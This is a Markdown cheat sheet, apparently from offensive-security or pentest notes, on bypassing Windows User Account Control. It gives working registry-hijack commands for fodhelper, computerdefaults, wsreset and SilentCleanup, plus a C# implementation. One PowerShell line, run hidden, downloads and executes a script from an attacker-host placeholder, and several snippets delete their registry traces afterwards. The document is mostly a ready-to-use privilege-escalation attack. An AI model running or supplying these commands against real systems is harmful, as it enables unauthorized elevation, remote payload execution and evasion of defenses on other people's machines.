---
tags:
  - Advanced
  - Defense_Evasion
  - Privilege_Escalation
  - UAC_Bypass
  - Windows
---

## UAC Bypass
resources: [UACME GitHub](https://github.com/hfiref0x/UACME)

> [!info] User Account Control (UAC) prompts for elevation. Certain auto-elevating binaries can be hijacked to bypass UAC without prompts.

### Fundamentals

#### UAC Levels
> - **Always notify** - Prompts for all elevation requests
> - **Notify only for apps** - Prompts for non-Windows apps (default)
> - **Notify only (no dim)** - Same but no secure desktop
> - **Never notify** - UAC disabled

#### Check UAC Status [Remote]
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

#### Auto-Elevating Binaries
> [!tip] Some Microsoft binaries auto-elevate without prompts. Can be exploited to run arbitrary code elevated.

### FodHelper UAC Bypass
> [!info] **fodhelper.exe** auto-elevates and checks registry for handler. Attacker-controlled registry key executes elevated.

#### Bypass Flow
> [!tip] Bypass sequence:
> 1. Write payload command to `HKCU\Software\Classes\ms-settings\shell\open\command`
> 2. Create `DelegateExecute` value (empty string)
> 3. Run fodhelper.exe
> 4. Payload executes elevated

#### Manual FodHelper Bypass [Remote]
```cmd
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "cmd.exe /c <Payload>" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe
reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f
```

#### PowerShell FodHelper Bypass [Remote]
```powershell
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "powershell -exec bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/payload.ps1')" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
Start-Sleep -Seconds 3
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Recurse -Force
```

### Alternative Bypass Methods

#### ComputerDefaults Bypass [alternative]
> [!tip] Similar technique using **computerdefaults.exe**.

```powershell
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "<Payload>" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Start-Process "C:\Windows\System32\computerdefaults.exe" -WindowStyle Hidden
```

#### WSReset Bypass [alternative]
> [!tip] Uses **wsreset.exe** for UAC bypass.

```cmd
reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635ber5wc2bqmne8p4\Shell\open\command" /ve /t REG_SZ /d "<Payload>" /f
reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635ber5wc2bqmne8p4\Shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
wsreset.exe
```

#### SilentCleanup Bypass [alternative]
> [!tip] Disk Cleanup auto-elevates.

```cmd
reg add "HKCU\Environment" /v windir /t REG_SZ /d "cmd.exe /c <Payload> &&" /f
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /i
reg delete "HKCU\Environment" /v windir /f
```

### C# UAC Bypass Implementation
```csharp
using Microsoft.Win32;
using System.Diagnostics;

class UACBypass
{
    static void Main()
    {
        string payload = @"powershell -exec bypass -nop -w hidden -c ""<Command>""";

        // Create registry keys
        RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
        key.SetValue("", payload);
        key.SetValue("DelegateExecute", "");
        key.Close();

        // Launch fodhelper
        Process.Start(new ProcessStartInfo
        {
            FileName = @"C:\Windows\System32\fodhelper.exe",
            WindowStyle = ProcessWindowStyle.Hidden
        });

        System.Threading.Thread.Sleep(3000);

        // Cleanup
        Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings");
    }
}
```
